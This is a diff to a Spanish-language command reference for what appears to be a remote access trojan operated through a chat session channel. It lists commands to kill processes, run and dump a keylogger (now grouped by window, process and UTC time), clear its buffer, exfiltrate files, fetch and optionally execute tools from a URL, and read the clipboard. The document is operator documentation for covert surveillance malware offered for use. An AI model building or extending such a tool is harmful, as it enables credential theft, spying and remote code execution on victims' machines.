@@ -11,7 +11,8 @@ Se ejecutan en el canal de sesión del equipo y responden ahí.
 | `/ps kill <pid>` | Mata el proceso y sus hijos. | Quitar lo que estorba. |
 | `/keylog start` | Reengancha el keylogger si lo detuviste. | Captura activa sin reiniciar. |
 | `/keylog stop` | Lo detiene hasta el próximo arranque. | Cortar la captura en caliente. |
-| `/keylog dump` | Publica lo capturado desde el último dump. | Extraer el log, sin pasar por start. |
+| `/keylog dump` | Publica el .txt agrupado por ventana, con proceso y hora UTC. | Leer qué se escribió y dónde. |
+| `/keylog clear` | Vacía el buffer en memoria. | Empezar un registro limpio. |
 | `/download <ruta>` | Sube un archivo o carpeta comprimida. | Sacar lo que interesa. |
 | `/upload <url>` | Descarga y opcionalmente ejecuta. | Meter una herramienta. |
 | `/clip get` | Lee el portapapeles. | Recuperar lo último copiado. |
